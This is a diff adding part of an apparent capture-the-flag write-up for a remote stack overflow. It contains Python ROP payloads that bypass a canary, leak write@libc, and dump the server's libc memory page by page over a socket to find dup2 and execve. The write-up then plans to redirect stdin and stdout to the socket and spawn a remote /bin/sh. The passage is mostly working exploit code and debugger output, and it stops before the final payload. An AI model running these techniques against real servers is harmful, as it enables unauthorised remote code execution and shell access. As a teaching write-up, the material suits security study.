@@ -555,3 +555,207 @@ Note: when we'll use `pop_rsi`, we have to remember that there's another `pop` t
 
 So after leaking the canary, RBP and return address, we construct another payload this time to leak the address of `write` (by using `write`! isn't that confusing?)
 
+```python
+gadget_pop_rsi_pop_r15_ret = text_section_base + 0xf71
+gadget_pop_rdi_ret         = text_section_base + 0xf73
+gadget_pop_rdx_ret         = text_section_base + 0xb53
+
+text_section_write_got = text_section_base + 0x202020
+text_section_write_plt = text_section_base + 0x910
+
+# After leaking the necessary values,
+# We create a new payload
+payload = "davide" + "AA"
+
+payload += p64(gadget_pop_rdi_ret ^ Ds)
+payload += p64(0x4 ^ Ds)
+payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
+payload += p64(text_section_write_got ^ Ds)
+payload += p64(0x1337)   # pop r15, dont-care
+payload += p64(gadget_pop_rdx_ret ^ Ds)
+payload += p64(0x8 ^ Ds)
+payload += p64(text_section_write_plt ^ Ds)
+
+
+# Pad to the end of buffer
+payload += "B" * (1032 - len(payload))
+
+payload += p64(canary ^ Ds)
+payload += p64(buffer_addr ^ Ds)
+payload += p64(text_section_leave_ret ^ Ds)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(SERVER)
+s.recv(4096)  # server hello
+s.send(payload)
+
+write_libc = s.recv(8)
+print "write@libc:", hex(unpack(write_libc))
+s.close()
+```
+Note how `text_section_write_got` and `text_section_write_got` are not the same thing! one is an entry in the GOT which is not executable, the other is the PLT stub of `write`. 
+
+Using this ROP chain we learn:
+```
+write@libc: 0x7ffff7af4140
+```
+
+Awesome! we can take this offset to some LIBC database and check the libc version, and from there compute other addresses located in this area and ROP our way to a shell
+
+### Problem, the address cannot be found in the databases!
+
+I've looked in some libc databases, namely https://github.com/niklasb/libc-database. And couldn't find the offset I found for `write` on the remote server in *any* of the databases that I've looked.
+
+I thought I'd try a different approach: so I cannot learn the libc version - but who cares? I have control over `write` and I can plug in what ever address I like there get back a byte from the process's memory. <br>
+I can use that to **leak all of the libc pages of the remote server's process** and look for the gadgets I want there. I thought that this might not have been the solution that most of the people who have solved this challenge used. But hey, if it works!
+
+### Dumping the entire libc content and looking for useful gadgets
+
+My goal is to leak all of the content of libc that is mapped to memory. Memory is mapped in chunks of pages. So I would take the address of `write` I have just leaked, and from this page I would scan up and down (jumping in size of a page which is usually `0x1000 = 4096`) and look for stuff I'm interested in.
+
+Since I can control the arguments plugged to functions I don't care about finding "/bin/sh", I can just look for `system` or `execve`.
+
+My strategy was to take the first few bytes from **my own libc implementation of functions** and look for them in server's. Using the strategy I couldn't find `system` as this is a rather large wrapper function that is likely to change between libc versions, but I did find `execve`.
+
+`int execve(const char *path, char *const argv[], char *const envp[]);` requires 3 arguments: they other two usually cannot be null and may crash the program it is trying to run, but that is not the case for `/bin/sh`, this makes things easier even thought it would not have been such a problem delivering the arrays necessary for arguments 2 and 3 (since again, we have control over the stack and can deliver any arguments we like) 
+
+### One last problem to solve
+If we make the remote server execute `execve("/bin/sh", NULL, NULL)` we're still not there! why?
+
+The shell is executed, however its inputs and outputs are the file descriptors inherited from the process that called `execve`, and if we recall - that process has its original standard input and output (file descriptors 0 and 1). And we communicate with the server via file descriptor 4.
+
+To get around this issue, we'd like to replace the STDIN and STDOUT of the process with the file descriptor of the socket (0x4). <br>
+To do that, we'll use the [dup2](https://linux.die.net/man/2/dup2) system call. dup2() duplicates a file descriptor (the first argument) to a second desired one. So our plan would be to:
+1. `close(0)` close the STDIN
+2. `close(1)` close the STDOUT
+3. `dup2(4,0)` dup our socket's file descriptor to take the place of STDIN
+4. `dup2(4,1)` same for STDOUT
+
+This makes our ROP chain a little bit longer, but it's not that terrible as we have a lot of room in our buffer. And eventually, when we'll call `execve` - we would have complete control ove the shell.
+
+
+### Enough chat, let's finish the exploit
+First, we need to find the starting bytes of `dup2` and `execve` in our local libc implementation, and look for them in the libc pages dumped from the server. As these are already system calls, we dont need much but something like:
+```
+mov eax, [SYSCALL_NUM]
+syscall
+```
+Let's do this:
+
+```
+gdb-peda$ x/8b dup2
+0x7ffff7af49a0 <dup2>:	0xb8	0x21	0x00	0x00	0x00	0x0f	0x05	0x48
+```
+Since `0x0f 0x05` is the `syscall` instruction, we can just stop there
+
+```
+gdb-peda$ x/8b execve
+0x7ffff7ac8e30 <execve>:	0xb8	0x3b	0x00	0x00	0x00	0x0f	0x05	0x48
+```
+
+I wrote something pretty ugly that gets the job done:
+```python
+libc_page = unpack(write_libc) & 0xfffffffffffff000
+page_size = 0x1000
+dup2_start      = "".join([chr(t) for t in [0xb8,	0x21,	0x00,	0x00,	0x00,	0x0f,	0x05]])
+execve_start    = "".join([chr(t) for t in [0xb8,	0x3b,	0x00,	0x00,	0x00,	0x0f,	0x05]])
+
+dup2_remote_addr = 0
+execve_remote_addr = 0
+
+# scan down
+print "Scanning down"
+while dup2_remote_addr == 0 or execve_remote_addr == 0:
+    try:
+        payload = "davide" + "AA"
+        payload += p64(gadget_pop_rdi_ret ^ Ds)
+        payload += p64(0x4 ^ Ds)
+        payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
+        payload += p64(libc_page ^ Ds)   # buffer = page
+        payload += p64(0x1337)   # pop r15, dont-care
+        payload += p64(gadget_pop_rdx_ret ^ Ds)
+        payload += p64(page_size ^ Ds)  # length
+        payload += p64(text_section_write_plt ^ Ds)
+        # Pad to the end of buffer
+        payload += "B" * (1032 - len(payload))
+        payload += p64(canary ^ Ds)
+        payload += p64(buffer_addr ^ Ds)
+        payload += p64(text_section_leave_ret ^ Ds)
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(SERVER)
+        s.recv(4096)  # server hello
+        s.send(payload)
+
+        page_data = s.recv(page_size)
+        if len(page_data) == 0:
+            break
+
+        if dup2_start in page_data:
+            dup2_remote_addr = libc_page + page_data.index(dup2_start)
+            print "Found dup2 @ {}".format(hex(dup2_remote_addr))
+
+        
+        if execve_start in page_data:
+            execve_remote_addr = libc_page + page_data.index(execve_start)
+            print "Found execve @ {}".format(hex(execve_remote_addr))
+
+
+        s.close()
+        libc_page -= page_size  # scan down
+
+    except EOFError:
+        break
+
+
+# scan up
+print "scanning up"
+libc_page = unpack(write_libc) & 0xfffffffffffff000
+while dup2_remote_addr == 0 or execve_remote_addr == 0:
+    try:
+        payload = "davide" + "AA"
+        payload += p64(gadget_pop_rdi_ret ^ Ds)
+        payload += p64(0x4 ^ Ds)
+        payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
+        payload += p64(libc_page ^ Ds)   # buffer = page
+        payload += p64(0x1337)   # pop r15, dont-care
+        payload += p64(gadget_pop_rdx_ret ^ Ds)
+        payload += p64(page_size ^ Ds)  # length
+        payload += p64(text_section_write_plt ^ Ds)
+        # Pad to the end of buffer
+        payload += "B" * (1032 - len(payload))
+        payload += p64(canary ^ Ds)
+        payload += p64(buffer_addr ^ Ds)
+        payload += p64(text_section_leave_ret ^ Ds)
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(SERVER)
+        s.recv(4096)  # server hello
+        s.send(payload)
+
+        page_data = s.recv(page_size)
+        if len(page_data) == 0:
+            break
+
+        if dup2_start in page_data:
+            dup2_remote_addr = libc_page + page_data.index(dup2_start)
+            print "Found dup2 @ {}".format(hex(dup2_remote_addr))
+
+        
+        if execve_start in page_data:
+            execve_remote_addr = libc_page + page_data.index(execve_start)
+            print "Found execve @ {}".format(hex(execve_remote_addr))
+
+
+        s.close()
+        libc_page += page_size  # scan down
+    except EOFError:
+        break
+
+print "libc scan over"
+```
+Note: one loop for scanning down, same loop for scanning up - yeah I know it's terrible code but it worked for me when I was constructing it and I wanted to make it more clear for the writeup so I decided to keep it.
+
+That's it, we have all of the information we need. Now we just construct the payload with the ROP chain, place a "/bin/sh" string on the stack and plug that to the `execve` which we will execute at the end of it:
+
+
